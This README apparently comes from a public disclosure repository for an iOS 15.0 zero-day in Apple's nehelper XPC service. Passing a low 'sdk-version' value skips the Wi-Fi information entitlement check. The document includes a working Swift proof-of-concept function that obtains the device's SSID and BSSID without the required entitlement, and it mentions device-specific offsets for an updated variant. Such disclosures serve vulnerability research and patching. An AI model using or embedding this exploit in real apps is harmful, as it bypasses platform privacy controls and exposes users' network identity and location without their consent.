# Nehelper Wifi Info 0-day (iOS 15.0)


I've updated this code to avoid using Private API directly. Read more in my [blog post](https://habr.com/en/post/580272/). However, that means that now this code is iOS version-specific and possibly device model-specific. So if it doesn't work on your device, recalculate and update the offsets in `c.c` file. The original code can be found in [direct](https://github.com/illusionofchaos/ios-nehelper-wifi-info-0day/tree/direct) branch.

XPC endpoint `com.apple.nehelper` accepts user-supplied parameter `sdk-version`, and if its value is less than or equal to 524288, `com.apple.developer.networking.wifi-info` entiltlement check is skipped.
Ths makes it possible for any qualifying app (e.g. posessing location access authorization) to gain access to Wifi information without the required entitlement.
This happens in `-[NEHelperWiFiInfoManager checkIfEntitled:]` in `/usr/libexec/nehelper`.

```
func wifi_info() -> String? {
    let connection = xpc_connection_create_mach_service("com.apple.nehelper", nil, 2)
    xpc_connection_set_event_handler(connection, { _ in })
    xpc_connection_resume(connection)
    let xdict = xpc_dictionary_create(nil, nil, 0)
    xpc_dictionary_set_uint64(xdict, "delegate-class-id", 10)
    xpc_dictionary_set_uint64(xdict, "sdk-version", 1) // may be omitted entirely
    xpc_dictionary_set_string(xdict, "interface-name", "en0")
    let reply = xpc_connection_send_message_with_reply_sync(connection, xdict)
    if let result = xpc_dictionary_get_value(reply, "result-data") {
        let ssid = String(cString: xpc_dictionary_get_string(result, "SSID"))
        let bssid = String(cString: xpc_dictionary_get_string(result, "BSSID"))
        return "SSID: \(ssid)\nBSSID: \(bssid)"
    } else {
        return nil
    }
}
```
